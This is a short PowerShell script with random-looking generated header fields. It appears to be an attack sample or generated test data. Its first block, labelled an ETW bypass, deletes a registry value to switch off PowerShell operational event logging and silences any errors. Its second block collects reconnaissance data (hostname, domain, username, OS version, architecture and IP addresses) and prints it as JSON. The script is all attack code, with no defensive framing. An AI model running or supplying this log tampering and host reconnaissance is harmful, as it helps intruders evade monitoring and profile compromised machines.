# V3z59oDabpYgFiy7Amh8
# Generated: 2025-11-03T12:20:52.708814
# System: 3BfYM0QSNfN3Ai2
# Process: VoNnyIZwgutt


# ETW Bypass via Registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Winevt\Channels\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -ErrorAction SilentlyContinue



# System reconnaissance
$systemInfo = @{
    Hostname = $env:COMPUTERNAME
    Domain = $env:USERDOMAIN
    Username = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -eq "Ethernet" -or $_.InterfaceAlias -eq "Wi-Fi"}).IPAddress
}

$systemInfo | ConvertTo-Json
